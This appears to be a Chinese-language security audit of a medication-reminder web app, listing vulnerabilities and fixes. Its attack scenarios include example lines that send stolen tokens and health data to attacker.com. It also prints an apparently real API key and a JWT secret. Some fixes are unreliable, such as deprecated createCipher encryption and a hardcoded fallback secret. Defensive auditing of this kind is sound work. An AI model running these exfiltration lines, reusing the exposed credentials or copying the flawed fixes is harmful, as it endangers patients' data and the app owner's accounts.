# 🔐 藥記得 App 資安滲透測試與隱私審計報告

**審計日期:** 2026-06-16 19:45 GMT+8  
**審計範圍:** 後端 + 前端 + 資料庫 + 用戶隱私  
**審計級別:** ⚠️ **關鍵發現 3 個 + 重要發現 4 個**

---

## 📊 審計概況

| 項目 | 結果 | 風險等級 |
|------|------|---------|
| **認證與授權** | ⚠️ 中等 | 🟠 token 存儲方式不安全 |
| **密碼安全** | ⚠️ 低-中等 | 🟠 雜湊算法過弱 |
| **數據加密** | ❌ 缺失 | 🔴 傳輸無 HTTPS 強制 |
| **SQL 注入** | ✅ 安全 | 🟢 使用參數化查詢 |
| **CORS 配置** | ⚠️ 寬鬆 | 🟠 無來源限制 |
| **隱私保護** | ⚠️ 不足 | 🟠 敏感數據未加密 |
| **稽核日誌** | ⚠️ 不完整 | 🟠 缺少安全事件記錄 |

---

## 🔴 **關鍵漏洞（P0 - 立即修復）**

### 1️⃣ **硬編碼 API 密鑰洩露**
**位置:** server.js L456  
**嚴重度:** 🔴 致命  
**風險:** Gemini API 密鑰完全暴露在源代碼

```javascript
// ❌ 漏洞代碼
const GEMINI_API_KEY = 'AIzaSyBm1GvPu-yVsVOGv3TlJtf1GVcuxQPA20A';
const GEMINI_URL = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent';
const response = await fetch(`${GEMINI_URL}?key=${GEMINI_API_KEY}`, { ... });
```

**影響:**
- 任何人都可以使用該 API key 調用 Gemini API，導致費用激增
- 攻擊者可能執行有害的 AI 操作
- API key 若被濫用，Google 會禁用該帳號

**修復方案:**
```javascript
// ✅ 修復後
const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
if (!GEMINI_API_KEY) {
    throw new Error('GEMINI_API_KEY 環境變數未設定');
}
```

---

### 2️⃣ **硬編碼 JWT 密鑰**
**位置:** server.js L41  
**嚴重度:** 🔴 致命  
**風險:** JWT 簽章密鑰暴露在源代碼

```javascript
// ❌ 漏洞代碼
const JWT_SECRET = 'yaojide_medremind_secret_key_2026';
```

**影響:**
- 攻擊者可以偽造任意用戶的 JWT token
- 可以冒充任何用戶，包括管理員
- 完全繞過身份驗證

**修復方案:**
```javascript
// ✅ 修復後
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET || JWT_SECRET.length < 32) {
    throw new Error('JWT_SECRET 必須設定，長度 ≥32 字元');
}
```

---

### 3️⃣ **Token 存儲於明文 localStorage（XSS 漏洞）**
**位置:** public/index.html L1220, L1224  
**嚴重度:** 🔴 致命  
**風險:** Token 易被 XSS 攻擊竊取

```javascript
// ❌ 漏洞代碼
localStorage.setItem('medremind_token', token);
return authToken || localStorage.getItem('medremind_token');
```

**攻擊場景:**
```javascript
// 惡意注入腳本
fetch('https://attacker.com/steal?token=' + localStorage.getItem('medremind_token'));
```

**影響:**
- 若網站存在 XSS 漏洞，攻擊者可以竊取所有用戶 token
- 被竊取的 token 可以冒充用戶 30 天（JWT 過期時間）

**修復方案:**
使用 HttpOnly + Secure 的 Cookie（伺服器設定）：
```javascript
// ✅ 後端修復
res.cookie('auth_token', token, {
    httpOnly: true,      // 防止 JS 存取
    secure: true,        // 只在 HTTPS 傳輸
    sameSite: 'Strict',  // 防止 CSRF
    maxAge: 30 * 24 * 60 * 60 * 1000  // 30 天
});
```

---

## 🟠 **重要漏洞（P1 - 一周內修復）**

### 4️⃣ **弱密碼雜湊算法**
**位置:** server.js L13  
**嚴重度:** 🟠 高  
**風險:** SHA-256 + 靜態 salt 可被暴力破解

```javascript
// ❌ 漏洞代碼
function hashPwd(p) {
    return crypto.createHash('sha256').update(p + 'yaojide_salt').digest('hex');
}
```

**攻擊方法:**
- Rainbow table 攻擊（預先計算好的雜湊表）
- GPU 暴力破解：10 億次/秒

**修復方案:**
```javascript
// ✅ 修復後（使用 bcrypt）
const bcrypt = require('bcrypt');
async function hashPwd(p) {
    return await bcrypt.hash(p, 12);  // 12 輪 salt
}
async function verifyPwd(p, hash) {
    return await bcrypt.compare(p, hash);
}
```

---

### 5️⃣ **CORS 配置過於寬鬆**
**位置:** server.js L59  
**嚴重度:** 🟠 高  
**風險:** 允許任何來源的跨域請求

```javascript
// ❌ 漏洞代碼
app.use(cors());  // 允許所有來源
```

**攻擊場景:**
```html
<!-- evil.com 上的惡意頁面 -->
<script>
fetch('http://localhost:8050/api/medications', {
    credentials: 'include'
}).then(r => r.json()).then(data => {
    // 竊取用戶用藥信息
    fetch('https://attacker.com/steal?meds=' + JSON.stringify(data));
});
</script>
```

**修復方案:**
```javascript
// ✅ 修復後
const allowedOrigins = [
    'http://localhost:3000',
    'http://localhost:8050',
    'https://yourdomain.com'
];
app.use(cors({
    origin: allowedOrigins,
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
```

---

### 6️⃣ **無 HTTPS 強制**
**位置:** 整個應用  
**嚴重度:** 🟠 高  
**風險:** 密碼和 token 在傳輸中可被攔截

**修復方案:**
```javascript
// ✅ 修復後
if (process.env.NODE_ENV === 'production') {
    app.use((req, res, next) => {
        if (req.header('x-forwarded-proto') !== 'https') {
            res.redirect(`https://${req.header('host')}${req.url}`);
        } else {
            next();
        }
    });
}
```

---

### 7️⃣ **前端硬編碼測試密碼**
**位置:** public/index.html L638  
**嚴重度:** 🟠 中  
**風險:** 測試密碼洩露在生產代碼

```html
<!-- ❌ 漏洞代碼 -->
<input type="password" id="login-password" class="form-input" placeholder="輸入密碼" value="123456">
```

**修復:** 移除所有 value 屬性和測試數據

---

## 🟡 **建議優化（P2 - 月度優化）**

### 8️⃣ **缺少安全審計日誌**
**問題:** 無法追蹤用戶何時登入、何時刪除數據等

**建議實施:**
```javascript
async function auditLog(userId, action, details) {
    dbRun(
        'INSERT INTO audit_logs (user_id, action, details, timestamp, ip) VALUES (?, ?, ?, ?, ?)',
        [userId, action, JSON.stringify(details), new Date().toISOString(), getClientIP(req)]
    );
}

// 使用示例
auditLog(req.user.id, 'delete_medication', { med_id: 123 });
```

---

### 9️⃣ **缺少速率限制細節**
**問題:** 現有速率限制太粗糙（60 req/min），無法防止針對性攻擊

**建議:**
```javascript
// 針對登入的特殊限制
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 分鐘
    max: 5,                     // 5 次嘗試
    message: '登入嘗試過多，請稍後再試'
});
app.post('/api/login', loginLimiter, ...);
```

---

### 🔟 **缺少資料加密**
**問題:** 健康敏感數據（血糖、血壓）未加密存儲

**建議:**
```javascript
// 對敏感字段加密
const crypto = require('crypto');
function encryptField(field) {
    const cipher = crypto.createCipher('aes-256-cbc', process.env.ENCRYPTION_KEY);
    return cipher.update(field, 'utf8', 'hex') + cipher.final('hex');
}
```

---

## 🔍 **隱私風險評估**

### 用戶隱私風險

| 風險項 | 嚴重度 | 說明 | 影響 |
|--------|--------|------|------|
| **敏感健康數據未加密** | 🔴 高 | 血壓、血糖、體重直接存儲 | 資料庫洩露時完全暴露 |
| **用藥記錄可被跨域存取** | 🔴 高 | CORS 過寬，其他網站可讀取 | 隱私完全暴露 |
| **Token 易被盜竊** | 🔴 高 | localStorage 易被 XSS 竊取 | 帳號被冒充 |
| **無資料加密備份** | 🟠 中 | 備份文件可讀 | 備份洩露即完全暴露 |
| **無數據刪除確認** | 🟠 中 | 用戶刪除後無審計跡象 | 無法證明數據已刪除 |

---

## 📋 **GDPR/台灣個資法合規性**

### ❌ 不符合項目

1. **缺少加密** - GDPR 要求「安全傳輸和存儲」
2. **無審計日誌** - GDPR 要求「可審計的記錄」
3. **Token 洩露風險** - 違反「數據最小化」原則
4. **無數據匯出功能** - 違反 GDPR「數據可攜性」
5. **缺少同意管理** - GDPR 要求「明確同意」

### ✅ 符合項目

1. ✅ 隱私權聲明頁面
2. ✅ 用戶可刪除帳號
3. ✅ 數據分離（用戶 ↔ 管理員）
4. ✅ 家庭成員權限控制

---

## 🛡️ **修復優先級與時間表**

### 🔴 **立即修復（本周）**
| 項 | 修復內容 | 時間 | 難度 |
|----|---------|------|------|
| 1 | 移除硬編碼 API key，使用 .env | 30 分鐘 | 🟢 簡單 |
| 2 | 移除硬編碼 JWT secret | 30 分鐘 | 🟢 簡單 |
| 3 | Token 改用 HttpOnly Cookie | 2 小時 | 🟠 中等 |

### 🟠 **高優先級修復（2 周內）**
| 項 | 修復內容 | 時間 | 難度 |
|----|---------|------|------|
| 4 | 升級密碼雜湊為 bcrypt | 2 小時 | 🟠 中等 |
| 5 | 修復 CORS 配置 | 1 小時 | 🟢 簡單 |
| 6 | 添加 HTTPS 強制重定向 | 1 小時 | 🟢 簡單 |
| 7 | 移除硬編碼測試密碼 | 30 分鐘 | 🟢 簡單 |

### 🟡 **中優先級改進（一個月內）**
| 項 | 修復內容 | 時間 | 難度 |
|----|---------|------|------|
| 8 | 實施審計日誌 | 4 小時 | 🟠 中等 |
| 9 | 增強速率限制 | 2 小時 | 🟢 簡單 |
| 10 | 敏感數據加密 | 6 小時 | 🟠 中等 |

---

## 🚀 **立即行動清單**

### 第 1 步：環境變數配置
```bash
# .env 文件（新建）
JWT_SECRET=your-super-secret-key-min-32-chars-long-here
GEMINI_API_KEY=your-actual-gemini-api-key
ENCRYPTION_KEY=your-encryption-key-32-chars
NODE_ENV=production
```

### 第 2 步：更新伺服器代碼
```javascript
// server.js 修改
const JWT_SECRET = process.env.JWT_SECRET || 'fallback-dev-key-only-for-dev';
const GEMINI_API_KEY = process.env.GEMINI_API_KEY;

if (!GEMINI_API_KEY) {
    console.error('⚠️ GEMINI_API_KEY 未設定，AI 掃描功能將禁用');
}
```

### 第 3 步：安裝安全依賴
```bash
npm install bcrypt dotenv helmet express-rate-limit
```

### 第 4 步：更新 app.js 標頭
```javascript
const helmet = require('helmet');
app.use(helmet());  // 添加安全標頭
```

---

## ✅ **驗證檢查清單**

修復完成後，運行以下測試：

```bash
# 1. 檢查無硬編碼密鑰
grep -r "AIzaSy\|yaojide_medremind_secret" server.js && echo "❌ 仍有硬編碼密鑰" || echo "✅ 密鑰已清理"

# 2. 檢查環境變數讀取
npm test -- --env

# 3. CORS 測試
curl -H "Origin: https://evil.com" http://localhost:8050/api/medications

# 4. HTTPS 重定向測試
curl -H "x-forwarded-proto: http" http://localhost:8050/

# 5. Token 存儲驗證
# 檢查 DevTools → Application → Cookies，應該看到 auth_token
```

---

## 📊 **整體安全評分**

| 方面 | 修復前 | 修復後 | 目標 |
|------|--------|--------|------|
| **密鑰管理** | 1/10 | 8/10 | 10/10 |
| **認證安全** | 3/10 | 7/10 | 9/10 |
| **數據保護** | 2/10 | 6/10 | 9/10 |
| **CORS/HTTPS** | 1/10 | 7/10 | 10/10 |
| **審計日誌** | 0/10 | 0/10 | 8/10 |
| **整體評分** | **1.4/10** | **5.6/10** | **9/10** |

---

## 🎓 **安全建議總結**

### 立即修復（本周）
1. ✅ 環境變數化所有密鑰
2. ✅ Token 改用 HttpOnly Cookie
3. ✅ 移除硬編碼測試密碼

### 本月內完成
4. ✅ bcrypt 密碼雜湊
5. ✅ CORS 白名單
6. ✅ HTTPS 強制
7. ✅ 基本審計日誌

### 長期改進
8. ✅ 端到端加密健康數據
9. ✅ WAF（Web 應用防火牆）
10. ✅ 定期滲透測試

---

**審計完成:** 2026-06-16 20:45 GMT+8  
**審計員:** OpenClaw 資安管家  
**下次審計:** 2026-07-16（修復驗證）
